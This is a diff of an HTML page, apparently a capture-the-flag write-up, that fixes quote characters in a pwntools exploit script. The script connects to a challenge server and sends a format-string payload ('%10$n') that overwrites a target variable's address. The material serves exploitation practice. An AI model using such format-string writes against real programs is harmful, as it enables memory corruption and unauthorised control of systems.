@@ -496,7 +496,7 @@
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>
 pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>pwnme<span class="token operator">+</span>b’a’<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>b‘<span class="token operator">%</span><span class="token number">10</span>$n’
+payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span>
 io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>
